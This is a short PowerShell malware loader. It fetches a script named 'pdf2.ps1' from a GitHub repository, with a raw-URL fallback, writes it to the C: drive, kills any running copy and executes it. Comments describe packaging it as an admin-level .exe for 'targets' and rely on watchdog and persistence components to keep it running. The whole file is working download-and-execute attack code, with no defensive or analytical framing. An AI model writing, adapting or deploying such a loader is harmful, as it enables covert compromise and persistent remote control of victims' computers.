# Loader — downloads latest pdf2.ps1 via GitHub API (no CDN cache) and runs it
# Converted to .exe with PS2EXE: one-click deploy or force-update on already-running targets
# requireAdmin ensures it runs as Administrator; watchdog/persistence handle the rest

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
$dest   = "C:\pdf2.ps1"
$apiUrl = "https://api.github.com/repos/pentoshi007/test/contents/pdf2.ps1"

# --- Download via GitHub Contents API (commit-pinned URL, never CDN-cached) ---
try {
    $wc = New-Object Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $wc.Headers.Add("Cache-Control", "no-cache, no-store")
    $json  = $wc.DownloadString($apiUrl)
    $dlUrl = ($json | Select-String '"download_url"\s*:\s*"([^"]+)"').Matches[0].Groups[1].Value
    $wc.DownloadFile($dlUrl, $dest)
    $wc.Dispose()
} catch {
    # Fallback: raw URL (may be cached, but better than nothing)
    try {
        $wc2 = New-Object Net.WebClient
        $wc2.Headers.Add("User-Agent", "Mozilla/5.0")
        $wc2.DownloadFile("https://raw.githubusercontent.com/pentoshi007/test/main/pdf2.ps1", $dest)
        $wc2.Dispose()
    } catch {}
}

# --- If already running: kill existing instance so watchdog relaunches fresh file ---
# (This covers the force-update scenario when deploying over a live client)
$existing = Get-WmiObject Win32_Process -Filter "Name='powershell.exe'" |
    Where-Object { $_.CommandLine -like "*pdf2.ps1*" -and $_.ProcessId -ne $PID }
foreach ($p in $existing) {
    try { Stop-Process -Id $p.ProcessId -Force -ErrorAction SilentlyContinue } catch {}
}

# --- Launch fresh ---
& $dest
